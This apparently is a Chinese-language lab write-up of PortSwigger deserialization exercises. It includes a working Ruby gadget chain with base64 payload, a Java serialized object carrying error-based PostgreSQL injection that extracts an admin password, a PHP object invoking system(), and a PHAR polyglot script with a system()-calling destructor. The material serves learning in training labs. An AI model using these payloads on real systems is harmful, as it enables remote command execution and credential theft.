/usr/lib/ruby/2.7.0/rubygems/stub_specification.rb:116:in initialize': No such file or directory @ rb_sysopen - |rm /home/carlos/morale.txt (Errno::ENOENT) from /usr/lib/ruby/2.7.0/rubygems/stub_specification.rb:116:in open' from /usr/lib/ruby/2.7.0/rubygems/stub_specification.rb:116:in data' from /usr/lib/ruby/2.7.0/rubygems/stub_specification.rb:158:in name' from /usr/lib/ruby/2.7.0/rubygems/source/specific_file.rb:65:in <=>' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:219:in sort' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:219:in tsort_each_child' from /usr/lib/ruby/2.7.0/tsort.rb:415:in call' from /usr/lib/ruby/2.7.0/tsort.rb:415:in each_strongly_connected_component_from' from /usr/lib/ruby/2.7.0/tsort.rb:349:in block in each_strongly_connected_component' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:215:in each' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:215:in tsort_each_node' from /usr/lib/ruby/2.7.0/tsort.rb:347:in call' from /usr/lib/ruby/2.7.0/tsort.rb:347:in each_strongly_connected_component' from /usr/lib/ruby/2.7.0/tsort.rb:281:in each' from /usr/lib/ruby/2.7.0/tsort.rb:281:in to_a' from /usr/lib/ruby/2.7.0/tsort.rb:281:in strongly_connected_components' from /usr/lib/ruby/2.7.0/tsort.rb:257:in strongly_connected_components' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:77:in dependency_order' from /usr/lib/ruby/2.7.0/rubygems/dependency_list.rb:100:in each' from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:297:in fix_syck_default_key_in_requirements' from /usr/lib/ruby/2.7.0/rubygems/requirement.rb:207:in marshal_load' from -e:13:in load' from -e:13:in <main>'
```

所以改用 [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

在 [Ruby 2.7 Online Tool](https://playground.masteringbackend.com/ruby) 貼上最終版的程式碼，並把最後兩行的輸出改成 base64

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
require "base64"
puts Base64.encode64(payload)
```

得到

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

之後在瀏覽器跑

```js
encodeURIComponent(`BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==`);
// BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06%0AOlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp%0Ab286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh%0AZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl%0AYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl%0AbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf%0AaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl%0ALnR4dAY7DFQ7EjoMcmVzb2x2ZQ%3D%3D
```

然後塞到 Cookie.session，就成功解題，也不知道為啥就成功了，沒啥成就感XDD

## Lab: Developing a custom gadget chain for Java deserialization

| Dimension | Description                                                                                                                                   |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit                                                     |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization |

在 HTML 的註解有看到 `<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->`，訪問 `/backup/AccessTokenUser.java` 後

https://replit.com/@samuel871211/java-serialization-example

```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

查了一下，Java 的 [Serializable](https://docs.oracle.com/javase/8/docs/api/java/io/Serializable.html)

```
public interface Serializable
Serializability of a class is enabled by the class implementing the java.io.Serializable interface. Classes that do not implement this interface will not have any of their state serialized or deserialized. All subtypes of a serializable class are themselves serializable. The serialization interface has no methods or fields and serves only to identify the semantics of being serializable.
```

就是一個純標記，每個實作 `Serializable` 的物件都要自行實作 `serialize` 跟 `deserialize` 的 method，跟 PHP 是不同的世界...

還好 PortSwigger 有提供 [`serialize` 跟 `deserialize` 的實作](https://replit.com/@portswigger/java-serialization-example#Main.java)

嘗試解一下 Cookie.session

```js
atob(
  `rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBobHppYTFseTVjYml6aWs1OGhkbXM2aDdvZmpuZ2M4NXQABndpZW5lcg==`,
);
// ¬í\x00\x05sr\x00/lab.actions.common.serializable.AccessTokenUser\x19Qüå\x12'©\x81\x02\x00\x02L\x00\vaccessTokent\x00\x12Ljava/lang/String;L\x00\busernameq\x00~\x00\x01xpt\x00 hlzia1ly5cbizik58hdms6h7ofjngc85t\x00\x06wiener
```

看到關鍵字 `lab.actions.common.serializable`，在 Java 的世界，這個 package 應該就是對應的 folder structure，我雖然沒寫過 Java，但概念上跟 NextJS 的 Pages Router 幾乎一樣

所以要新增 `lab/actions/common/serializable/AccessTokenUser.java`，內容就是上面的 AccessTokenUser.java，記得把第一行改成

```java
package lab.actions.common.serializable;
```

嘗試解開 `wiener:peter` 的 AccessToken

```java
import lab.actions.common.serializable.AccessTokenUser;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        String serializedObject = "rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBobHppYTFseTVjYml6aWs1OGhkbXM2aDdvZmpuZ2M4NXQABndpZW5lcg==";
        AccessTokenUser deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object: " + deserializedObject.getUsername() + ", "
                + deserializedObject.getAccessToken());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(
                new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

得到結果是 `Deserialized object: wiener, hlzia1ly5cbizik58hdms6h7ofjngc85`

嘗試用 `administrator:hlzia1ly5cbizik58hdms6h7ofjngc85` 去組

```java
AccessTokenUser originalObject = new AccessTokenUser("administrator", "hlzia1ly5cbizik58hdms6h7ofjngc85");
String serializedObject = serialize(originalObject);
System.out.println("Serialized object: " + serializedObject);
```

得到 `Serialized object: rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBobHppYTFseTVjYml6aWs1OGhkbXM2aDdvZmpuZ2M4NXQADWFkbWluaXN0cmF0b3I=`

塞到 Cookie.session 之後，直接 302 回登入頁QQ

目前卡在

```
To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password.
```

嘗試訪問 `/backup`，結果有 Directory Listing，看到 ProductTemplate.java

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

關鍵在這裡有 SQLi

```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

另外關於 [Transient](https://docs.oracle.com/javase/specs/jls/se25/html/jls-8.html#jls-8.3.1.3) 的介紹

```
Variables may be marked transient to indicate that they are not part of the persistent state of an object.
```

新增 `data/productcatalog/ProductTemplate.java`

```java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId()
    {
        return id;
    }
}
```

Main.java

```java
import data.productcatalog.ProductTemplate;

ProductTemplate originalObject = new ProductTemplate("'");
String serializedObject = serialize(originalObject);
System.out.println("Serialized object: " + serializedObject);
```

塞到 Cookie.session 重整後，確定有 SQLi

```
java.io.IOException: org.postgresql.util.PSQLException: Unterminated string literal started at position 36 in SQL SELECT * FROM products WHERE id = ''' LIMIT 1. Expected char
```

嘗試 UNION Based SQLi `' UNION SELECT NULL-- 123`

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns Position: 51
```

在 8 個 columns 的時候 UNION 成功

```
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
```

應該是用 Error-Based-SQLi 提取資料

```sql
' UNION SELECT NULL,NULL,NULL,CAST(string_agg(table_name, ',') AS int),NULL,NULL,NULL,NULL FROM information_schema.tables--
```

錯誤訊息

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "users,pg_type,products,pg_foreign_server,pg_roles,pg_settings,pg_cursors,pg_stat_bgwriter,pg_subscription,pg_stat_progress_vacuum,pg_stat_progress_cluster,pg_attribute,pg_proc,pg_class,pg_attrdef,pg_constraint,pg_inherits,pg_index,pg_operator,pg_opfamily,pg_opclass,pg_am,pg_amop,pg_amproc,pg_language,pg_largeobject_metadata,pg_aggregate,pg_stat_progress_create_index,pg_user_mappings,pg_statistic_ext,pg_rewrite,pg_trigger,pg_event_trigger,pg_description,pg_cast,pg_enum,pg_namespace,pg_conversion,pg_depend,pg_database,pg_db_role_setting,pg_tablespace,pg_pltemplate,pg_auth_members,pg_shdepend,pg_shdescription,pg_ts_config,pg_ts_config_map,pg_ts_dict,pg_ts_parser,pg_ts_template,pg_extension,pg_foreign_data_wrapper,pg_foreign_table,pg_policy,pg_replication_origin,pg_default_acl,pg_init_privs,pg_seclabel,pg_shseclabel,pg_collation,pg_partitioned_table,pg_range,pg_transform,pg_sequence,pg_publication,pg_publication_rel,pg_subscription_rel,pg_group,pg_user,pg_policies,pg_rules,pg_views,pg_tables,pg_matviews,pg_indexes,pg_sequences,pg_stats,pg_stats_ext,pg_publication_tables,pg_locks,pg_available_extensions,pg_available_extension_versions,pg_prepared_xacts,pg_prepared_statements,pg_seclabels,pg_statio_sys_tables,pg_timezone_abbrevs,pg_timezone_names,pg_statio_user_tables,pg_stat_all_tables,pg_stat_xact_all_tables,pg_stat_sys_tables,pg_stat_xact_sys_tables,pg_stat_user_tables,pg_stat_xact_user_tables,pg_statio_all_tables,pg_stat_all_indexes,pg_stat_sys_indexes,pg_stat_user_indexes,pg_statio_all_indexes,pg_statio_sys_indexes,pg_statio_user_indexes,pg_statio_all_sequences,pg_statio_sys_sequences,pg_statio_user_sequences,pg_stat_activity,pg_stat_replication,pg_stat_wal_receiver,pg_stat_subscription,pg_stat_ssl,pg_stat_gssapi,pg_replication_slots,pg_stat_database,pg_stat_database_conflicts,pg_stat_user_functions,pg_stat_xact_user_functions,pg_stat_archiver,information_schema_catalog_name,check_constraint_routine_usage,applicable_roles,administrable_role_authorizations,collation_character_set_applicability,attributes,check_constraints,character_sets,collations,column_domain_usage,column_column_usage,column_privileges,column_udt_usage,columns,constraint_column_usage,schemata,constraint_table_usage,domain_constraints,sql_packages,domain_udt_usage,sequences,domains,enabled_roles,key_column_usage,parameters,referential_constraints,sql_features,role_column_grants,routine_privileges,role_routine_grants,routines,sql_implementation_info,sql_languages,sql_sizing,sql_sizing_profiles,table_constraints,table_privileges,role_table_grants,views,tables,triggered_update_columns,triggers,data_type_privileges,udt_privileges,role_udt_grants,usage_privileges,element_types,role_usage_grants,user_defined_types,view_column_usage,view_routine_usage,view_table_usage,foreign_server_options,column_options,foreign_data_wrapper_options,foreign_tables,foreign_data_wrappers,foreign_servers,foreign_table_options,user_mappings,user_mapping_options"
```

第一張表 `users` 應該就是我們的目標

嘗試

```sql
' UNION SELECT NULL,NULL,NULL,CAST(string_agg(column_name, ',') AS int),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users'--
```

得到

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "username,password,email"
```

看來 Lab 環境真的有簡化過，推測 password 應該是明碼存XD

嘗試

```sql
' UNION SELECT NULL,NULL,NULL,CAST(password AS int),NULL,NULL,NULL,NULL FROM users WHERE username = 'administrator'--
```

得到

```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "1cipj1qj7mhsa7wohajv"
```

成功解題～這題我主要有幾個卡點

1. 在 `AccessTokenUser` 花太多時間，但這邊只有 username 跟 accessToken，拿不到 password
2. 沒有想到 `/backup` 資料夾有 Directory Listing，是 AI 提示我的
3. 在 serialize `ProductTemplate` 的階段，實際上只需要 class + constructor method 就可以了

## Lab: Developing a custom gadget chain for PHP deserialization

| Dimension | Description                                                                                                                                  |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#creating-your-own-exploit                                                    |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization |

進到首頁，看到 HTML 的內容有 `<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->`

訪問 `/cgi-bin/libs/CustomTemplate.php~`

```php
class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

查看 [\_\_sleep](https://www.php.net/manual/en/language.oop5.magic.php) 的解釋

```
serialize() checks if the class has a function with the magic name __sleep(). If so, that function is executed prior to any serialization. It can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. If the method doesn't return anything then null is serialized and E_NOTICE is issued.
```

查看 [\_\_get](https://www.php.net/manual/en/language.oop5.overloading.php#object.get) 的解釋

```
__get() is utilized for reading data from inaccessible (protected or private) or non-existing properties.
```

查看 [call_user_func](https://www.php.net/manual/en/function.call-user-func.php) 的解釋

```
call_user_func(callable $callback, mixed ...$args): mixed

Calls the callback given by the first parameter and passes the remaining parameters as arguments.
```

嘗試

```js
encodeURIComponent(
  btoa(
    `O:14:"CustomTemplate":2:{s:33:"\x00CustomTemplate\x00default_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"\x00CustomTemplate\x00desc";O:10:"DefaultMap":1:{s:20:"\x00DefaultMap\x00callback";s:6:"system";}}`,
  ),
);
```

成功解題～

這題我主要有幾個卡點

1. 沒看過的 function 或是 method，直接上網查 `PHP ${function}` 最快，例如 `PHP call_user_func`
2. serialize class 的階段，只會保留 class 的狀態，可以想像成是 `React.useState`
3. deserialize class 的階段，會嘗試呼叫 `__wakeup`，但不會呼叫 `__construct`

## Lab: Using PHAR deserialization to deploy a custom gadget chain

| Dimension | Description                                                                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/deserialization/exploiting#phar-deserialization                                                           |
| Lab       | https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain |

這題有上傳頭像的功能，想像上 `.phar` 檔案就是要從這邊注入，上傳一個正常的頭像後，網址是 /cgi-bin/avatar.php?avatar=wiener

嘗試訪問 `/cgi-bin/avatar.php~` 但得到 404 Not Found

後來在 `/cgi-bin` 找到 Directory Listing

CustomTemplate.php

```php
class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
```

Blog.php

```php
require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}
```

下一步要先找到上傳檔案的漏洞，嘗試創建

addMagicNumber.js

```js
const fs = require("fs");

const minimalJpgMagic = Buffer.from([0xff, 0xd8, 0xff, 0xe0]);

try {
  // 1. 讀取完整的 .phar 檔案內容
  const pharContent = fs.readFileSync("evil.phar");

  // 2. 創建一個新的 Buffer，長度為 Magic Number + 原始檔案長度
  const outputBuffer = Buffer.concat([minimalJpgMagic, pharContent]);

  // 3. 寫入新的 Polyglot 檔案
  fs.writeFileSync("evil.jpg", outputBuffer);
} catch (error) {
  console.log(error);
}
```

evil.php

```php
// attacker's machine
class EvilClass {
    function __destruct() {
        system($this->cmd);
    }
}

$evil = new EvilClass();
$evil->cmd = 'whoami';

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($evil);  // serialized 存在 Manifest
$phar->addFromString('dummy.txt', 'content');
$phar->stopBuffering();
```

Online PHP Editor 應該沒辦法用，因為這是要創建一個 .phar 檔案，要在 php.ini 設定 `phar.readonly = Off`

產出的 evil.jpg 上傳後，回傳 `Invalid Avatar`，看來只有前 4 個 Byte 的 Magic Number 還不夠

決定先把 [File Upload](https://portswigger.net/web-security/file-upload) 的 Labs 打完，再來解這題

11/09 更，感覺這題太難，先照著 Solution 走一次就好

## 小結

在解這個 Lab 之前，對於 serialize 跟 deserialize 的概念就是 `JSON.stringify` 跟 `JSON.parse`，但這兩個方法就是單純 JSON string 跟 Javascript Object 的轉換，

到了 PHP, Java 的世界，serialize 跟 deserialize 的概念就不太一樣了，可以直接透過 deserialize 來還原一個物件的狀態，並且還有 Magic Methods 的概念，這些都是我不曾接觸過的，學完這個 Lab 以後，感覺算是入門一個新的領域了，也意識到自己在後端開發的不足QQ

## 參考資料

- https://portswigger.net/web-security/deserialization
